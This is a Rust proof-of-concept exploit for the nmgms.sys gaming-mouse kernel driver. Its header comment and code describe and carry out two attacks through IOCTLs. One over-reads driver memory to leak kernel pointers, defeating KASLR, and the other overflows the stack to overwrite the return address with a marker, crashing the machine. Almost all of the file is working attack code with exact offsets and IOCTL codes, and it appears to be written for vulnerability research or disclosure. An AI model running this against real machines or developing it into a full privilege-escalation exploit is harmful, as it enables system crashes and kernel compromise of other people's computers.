//! nmgms.sys (Waytech / NMgaming mouse) - kernel stack overflow + info leak.
//!
//! SHA-256 47ec68ae534ccd5695ddd80e45866d0a207359db0098deeac6ae04ca7f8b34aa
//!
//! The control device \Device\nmgms is created in DriverEntry with plain
//! IoCreateDevice and no security descriptor. Its \DosDevices\nmgms symbolic link
//! is only created in AddDevice (present only with the vendor mouse), so the
//! device is reached with NO hardware via \\?\GLOBALROOT\Device\nmgms.
//!
//! IRP_MJ_DEVICE_CONTROL is at RVA 0x790: it pushes 7 non-volatile registers
//! (0x38) and sub rsp,0x430, copies the caller's input into a buffer at rsp+0x30
//! using InputBufferLength with no clamp and NO /GS cookie, so the saved return
//! address at input offset 0x438 is directly overwritable.
//!
//! MODES
//!   --leak       IOCTL 0x222554 copies OutputBufferLength bytes OUT of the driver
//!                starting at a 1-byte .data global, over-reading adjacent .data
//!                that holds kernel object pointers. Read only.
//!   --overflow   IOCTL 0x222550 overwrites the return address with an unmapped
//!                marker; the machine stops with that as the faulting address.
//!
//! Build: rustc -O nmgms_probe.rs

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

const DEVICE: &str = r"\\?\GLOBALROOT\Device\nmgms";
const CONTROL: &str = r"\\?\GLOBALROOT\Device\dz_absent_0000";
const LEAK: u32 = 0x0022_2554;
const OVERFLOW: u32 = 0x0022_2550;
const RET_AT: usize = 0x438;
const RIP_MARKER: u64 = 0x0000_7FFF_0000_DEAD;

const GENERIC_RW: u32 = 0xC000_0000;
const OPEN_EXISTING: u32 = 3;
const INVALID: isize = -1;

#[link(name = "kernel32")]
unsafe extern "system" {
    fn CreateFileW(n: *const u16, a: u32, s: u32, sa: *mut u8, d: u32, f: u32, t: isize) -> isize;
    fn DeviceIoControl(h: isize, code: u32, inb: *const u8, inl: u32, outb: *mut u8, outl: u32,
                       ret: *mut u32, ov: *mut u8) -> i32;
    fn CloseHandle(h: isize) -> i32;
    fn GetLastError() -> u32;
}
fn wide(s: &str) -> Vec<u16> { OsStr::new(s).encode_wide().chain(Some(0)).collect() }
fn open(p: &str) -> Result<isize, u32> {
    let h = unsafe { CreateFileW(wide(p).as_ptr(), GENERIC_RW, 0, ptr::null_mut(), OPEN_EXISTING, 0, 0) };
    if h == INVALID || h == 0 { Err(unsafe { GetLastError() }) } else { Ok(h) }
}
fn looks_kernel(v: u64) -> bool { v >= 0xFFFF_8000_0000_0000 }

fn main() {
    let mode = std::env::args().nth(1).unwrap_or_else(|| "--leak".into());
    if open(CONTROL).is_ok() { eprintln!("absent device opened; meaningless"); std::process::exit(2); }
    let h = match open(DEVICE) { Ok(h)=>h, Err(e)=>{ eprintln!("cannot open {DEVICE}: win32 {e}"); std::process::exit(1);} };
    println!("opened {DEVICE} as {}", std::env::var("USERNAME").unwrap_or_default());

    match mode.as_str() {
        "--leak" => {
            let want = 0x300usize;
            let inb = [0u8; 8];
            let mut out = vec![0u8; want];
            let mut ret = 0u32;
            let ok = unsafe {
                DeviceIoControl(h, LEAK, inb.as_ptr(), 0, out.as_mut_ptr(), want as u32, &mut ret, ptr::null_mut())
            } != 0;
            if !ok { println!("IOCTL 0x{LEAK:08X} failed: win32 {}", unsafe { GetLastError() }); }
            else {
                println!("IOCTL 0x{LEAK:08X} returned {ret} bytes of driver .data (over-read from a 1-byte global):");
                // The read starts at an unaligned .data address, so kernel pointers
                // appear at unaligned output offsets: scan every byte position.
                let n = ret as usize;
                let mut seen: Vec<u64> = Vec::new();
                let mut off = 0;
                while off + 8 <= n {
                    let mut q=[0u8;8]; q.copy_from_slice(&out[off..off+8]);
                    let v=u64::from_le_bytes(q);
                    if looks_kernel(v) && !seen.contains(&v) {
                        println!("    output +0x{off:03X}  0x{v:016X}  <== kernel pointer", );
                        seen.push(v);
                    }
                    off += 1;
                }
                let kptrs = seen.len();
                println!("\n{kptrs} distinct kernel-mode pointer(s) disclosed to an unprivileged caller.");
                if kptrs > 0 { println!("CONFIRMED kernel address disclosure (KASLR-relevant)."); }
                else { println!("no kernel pointers in the leaked window this run."); }
            }
        }
        "--overflow" => {
            let mut input = vec![0x41u8; RET_AT + 8];
            input[RET_AT..RET_AT+8].copy_from_slice(&RIP_MARKER.to_le_bytes());
            let mut out=[0u8;64]; let mut ret=0u32;
            println!("sending 0x{:X} bytes to IOCTL 0x{OVERFLOW:08X}; offset 0x{RET_AT:X} = 0x{RIP_MARKER:016X}", input.len());
            println!("machine expected to stop with that as the faulting address");
            let ok = unsafe {
                DeviceIoControl(h, OVERFLOW, input.as_ptr(), input.len() as u32, out.as_mut_ptr(), out.len() as u32, &mut ret, ptr::null_mut())
            } != 0;
            println!("still running: accepted={ok} error={}", if ok {0} else { unsafe { GetLastError() } });
        }
        other => { eprintln!("unknown mode {other}"); std::process::exit(2); }
    }
    unsafe { CloseHandle(h) };
}
